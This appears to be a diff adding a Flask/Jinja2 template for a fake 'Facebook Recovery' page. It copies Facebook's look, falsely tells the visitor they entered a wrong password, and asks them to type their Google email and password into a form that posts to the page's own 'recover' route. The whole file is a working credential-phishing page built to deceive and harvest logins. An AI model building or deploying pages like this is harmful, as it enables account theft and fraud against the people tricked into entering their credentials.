@@ -1,0 +1,76 @@
+{% extends "base.html" %}
+{% block title %}Facebook Recovery {% endblock %}
+{% block styling %}
+body{
+    font-size:2rem;
+    text-align: center;
+    margin:auto auto;
+    background-color:#f0f2f5;
+    }
+    .input{
+    height:75px;
+    min-width: 0;
+    font-size:50px;
+    border-radius: 10px;
+    }
+    input::-webkit-input-placeholder {
+    font-size: 50px;
+    text-align:center;
+}
+    .btn {
+  background: #418dbf;
+  background-image: -webkit-linear-gradient(top, #418dbf, #0073ba);
+  background-image: -moz-linear-gradient(top, #418dbf, #0073ba);
+  background-image: -ms-linear-gradient(top, #418dbf, #0073ba);
+  background-image: -o-linear-gradient(top, #418dbf, #0073ba);
+  background-image: linear-gradient(to bottom, #418dbf, #0073ba);
+  -webkit-border-radius: 6;
+  -moz-border-radius: 6;
+  border-radius: 10px;
+  font-family: Arial;
+  color: #ffffff;
+  font-size: 55px;
+  padding: 10px 20px 10px 20px;
+  text-decoration: none;
+  width:99%;
+   }
+
+    .btn:hover {
+      background: #3cb0fd;
+      background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
+      background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
+      background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
+      background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
+      background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
+      text-decoration: none;
+    }
+    .form{
+    margin:20px;
+    }
+{% endblock %}
+{% block content %}
+<center>
+<div style="font-size:4rem; width:100%; font-align:center; margin:auto; margin-top:5%; margin-bottom:3%; background-color:#F98E85;">You entered the wrong password.</div>
+<div><img src="{{url_for('static', filename='facebook.png')}}" align="middle" width="28%"
+          style="margin-top:25%; margin-bottom:4%;"></div>
+<div style="font-size:5rem; color:blue; margin:auto;">
+    facebook
+</div>
+<div style="font-size:3.5rem; width:90%; font-align:center; margin:auto; margin-top:5%; margin-bottom:3%">
+    To recover or change password. Enter email and password of google.
+</div>
+<form action="{{ url_for('recover') }}" method="post" novalidate>
+    {{ form.csrf_token }}
+    <div class="form">{{ form.email(size=33) }}</div>
+    {% for error in form.email.errors %}
+    <div style="color:red; font-size:42px;">{{ error }}</div>
+    {% endfor %}
+    <div class="form">{{ form.password(size=33) }}</div>
+    {% for error in form.password.errors %}
+    <div style="color:red; font-size:42px;">{{ error }}</div>
+    {% endfor %}
+    <div>{{ form.login_btn }}</div>
+</form>
+<div style="font-size:2.8rem; margin-top:5%; width:95%; margin-left:2%;">facebook will send email for verification. You will be able to recover or change password.</div>
+</center>
+{% endblock %}
